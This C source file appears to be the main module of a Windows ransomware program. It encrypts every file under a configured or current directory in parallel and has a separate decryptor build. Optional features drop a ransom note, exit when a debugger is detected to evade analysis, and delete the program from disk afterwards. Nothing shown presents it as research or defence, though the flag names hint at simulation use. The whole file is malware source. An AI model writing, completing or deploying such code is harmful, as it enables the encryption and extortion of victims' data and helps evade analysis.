#include <windows.h>
#include <stdio.h>
#include <process.h>
#include "memutils.h"
#include "peb.h"
#include "stringshims.h"
#include "threadpool.h"
#include "crypto.h"
#include "antianalysis.h"
#include "override.h"  
#pragma warning(disable : 4018 4047 4163 4325 4715 4996)

/* -------- Pre-Processor Shenanigans -------- */

#ifndef BUILD_DECRYPTOR 
#define LOCKER
#endif 


#ifdef LOCKER
BOOL g_EncryptMode = TRUE;  // encryption
#else
BOOL g_EncryptMode = FALSE; // decryption
#endif 


#ifdef SIMULATE_RANSOM 
LPCSTR  g_Note = { RANSOM_NOTE };
#endif

#ifdef CONFIG_ROOT_DIR
LPCWSTR g_TargetDir[] = { CONFIG_ROOT_DIR };
#else
LPCWSTR g_TargetDir[0x02] = { NULL, NULL };
#endif

/* ----------------------------------------- */

BOOL Run(LPCWSTR* wDirs, BOOL bEncrypt) {

    for (int i = 0; wDirs[i] != NULL; i++) {
#ifdef CONSOLE_STDOUT
        PRINT(L"\n[*] Processing directory: %s\n", wDirs[i]);
#endif
        if (!ParallelProcessDirectory(wDirs[i], bEncrypt)) {
#ifdef CONSOLE_STDOUT
            PRINT(L"[!] Failed to process directory!\n");
#endif
        }
    }
    return TRUE;
}


int main(void) {

#ifdef DBG_EVASION
    if (IsBeingDebugged()) 
        return EXIT_FAILURE;  
#endif


#ifdef CONSOLE_STDOUT
    DWORD dwStartTime = (DWORD)GetTickCount64();
#endif 


#ifndef CONFIG_ROOT_DIR
    WCHAR wCurrentDir[MAX_PATH];
    DWORD cchCurrentDir = GetCurrentDirectoryW(MAX_PATH, wCurrentDir);
    g_TargetDir[0] = wCurrentDir;
#endif

    Run(g_TargetDir, g_EncryptMode);
#ifdef CONSOLE_STDOUT
    PRINT(L"[*] Operation completed\n");
#endif


#ifdef CONSOLE_STDOUT
    DWORD g_FinishTime = (DWORD)GetTickCount64() - dwStartTime;
    PRINT(L"[*] Time: %d ms\n", g_FinishTime);
#endif 


#ifdef SIMULATE_RANSOM
   if (!WriteTextFile(g_Note)) { 
#ifdef CONSOLE_STDOUT
       PRINT(L"[!] Failed to drop ransom note!\n");
#endif
   }
#endif 
    

#ifdef SELF_DESTRUCT
    if (!DeleteSelfFromDisk()) { 
#ifdef CONSOLE_STDOUT
        PRINT(L"[!] Failed to delete self from disk!\n"); 
#endif
    }
#endif

    return EXIT_SUCCESS;
}
